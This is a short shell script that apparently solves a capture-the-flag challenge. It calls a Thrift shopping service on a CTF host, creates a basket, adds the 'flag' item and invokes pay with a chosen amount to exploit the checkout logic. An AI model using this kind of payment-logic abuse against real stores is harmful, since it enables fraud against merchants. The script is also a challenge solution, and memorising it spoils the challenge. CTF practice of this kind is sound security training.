#!/bin/sh

basket=$(./gen-py/schema/ShoppingService-remote -h thrift-store.chal.imaginaryctf.org:9090 -framed createBasket)
basket_id=$(echo "$basket" | rg -o "'([a-f0-9-]+)'" | tr -d "'")

echo "Found -> $basket_id"

sleep 1
./gen-py/schema/ShoppingService-remote -h thrift-store.chal.imaginaryctf.org:9090 -framed getInventory | rg "flag"
sleep 1
./gen-py/schema/ShoppingService-remote -h thrift-store.chal.imaginaryctf.org:9090 -framed getBasket "$basket_id"
sleep 1
./gen-py/schema/ShoppingService-remote -h thrift-store.chal.imaginaryctf.org:9090 -framed addToBasket "$basket_id" "flag"
sleep 1
./gen-py/schema/ShoppingService-remote -h thrift-store.chal.imaginaryctf.org:9090 -framed getBasket "$basket_id"
sleep 1
./gen-py/schema/ShoppingService-remote -h thrift-store.chal.imaginaryctf.org:9090 -framed pay "$basket_id" 9999
sleep 1
./gen-py/schema/ShoppingService-remote -h thrift-store.chal.imaginaryctf.org:9090 -framed getBasket "$basket_id"